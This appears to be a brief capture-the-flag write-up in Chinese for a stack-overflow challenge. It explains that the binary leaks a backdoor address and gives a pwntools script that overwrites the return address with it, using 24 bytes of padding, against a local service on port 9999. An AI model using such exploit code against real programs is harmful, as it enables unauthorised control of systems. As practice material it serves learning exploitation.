## 思路

白给backdoor，栈溢出把返回地址盖成backdoor

## EXP

```c
from pwn import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'

p=remote('127.0.0.1',9999)
p.recvuntil(b'Give you the backdoor: 0x')
backdoor=int(p.recvline()[:-1].decode(),16)
print(hex(backdoor))
p.sendlineafter(b'Something to tell me?\n',b'a'*24+p64(backdoor))
p.interactive()
```

